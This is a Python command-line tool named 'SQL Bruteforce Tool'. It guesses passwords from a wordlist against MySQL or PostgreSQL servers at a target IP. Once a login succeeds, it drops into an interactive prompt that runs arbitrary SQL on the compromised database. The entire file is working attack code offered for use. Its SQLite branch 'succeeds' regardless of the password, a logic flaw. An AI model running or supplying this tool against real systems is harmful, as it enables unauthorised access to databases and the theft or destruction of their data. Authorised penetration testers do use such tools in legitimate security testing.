import argparse
import mysql.connector
import psycopg2
import sqlite3
import os
from colorama import Fore, Style
import time

def connect_mysql(username, password, target_ip):
    try:
        connection = mysql.connector.connect(
            host=target_ip,
            user=username,
            password=password
        )
        return connection
    except mysql.connector.Error:
        return None

def connect_postgresql(username, password, target_ip):
    try:
        connection = psycopg2.connect(
            host=target_ip,
            user=username,
            password=password
        )
        return connection
    except psycopg2.OperationalError:
        return None

def connect_sqlite3(target_ip):
    try:
        connection = sqlite3.connect(target_ip)
        return connection
    except sqlite3.Error:
        return None

def execute_commands(connection):
    while True:
        command = input(Fore.CYAN + "SQL Command: " + Style.RESET_ALL)
        if command.lower() == 'exit':
            break
        try:
            cursor = connection.cursor()
            cursor.execute(command)
            result = cursor.fetchall()
            for row in result:
                print(row)
            cursor.close()
        except Exception as e:
            print(Fore.RED + f"Error executing command: {str(e)}" + Style.RESET_ALL)

def brute_force_sql(username, passwordlist, target_ip, db_type):
    with open(passwordlist, 'r') as file:
        for line in file:
            password = line.strip()
            print(Fore.YELLOW + f"Trying Passphrase: \"{password}\"" + Style.RESET_ALL)

            connection = None

            # Choose connection method based on DB type
            if db_type == 'mysql':
                connection = connect_mysql(username, password, target_ip)
            elif db_type == 'postgresql':
                connection = connect_postgresql(username, password, target_ip)
            elif db_type == 'sqlite3':
                connection = connect_sqlite3(target_ip)

            if connection:
                print(Fore.GREEN + f"KEY FOUND: [\"{password}\"]" + Style.RESET_ALL)
                execute_commands(connection)
                connection.close()
                break
            else:
                print(Fore.RED + "KEY NOT FOUND" + Style.RESET_ALL)
                time.sleep(0.5)

def main():
    parser = argparse.ArgumentParser(description="SQL Bruteforce Tool")
    parser.add_argument("-l", "--username", required=True, help="Username to attempt login with")
    parser.add_argument("-P", "--passwordlist", required=True, help="Path to password list file")
    parser.add_argument("sql", help="Target SQL connection string, example: sql://<target-ip>")
    parser.add_argument("-t", "--type", choices=['mysql', 'postgresql', 'sqlite3'], required=True, help="Database type")

    args = parser.parse_args()

    target_ip = args.sql.split("://")[1]
    
    brute_force_sql(args.username, args.passwordlist, target_ip, args.type)

if __name__ == "__main__":
    main()
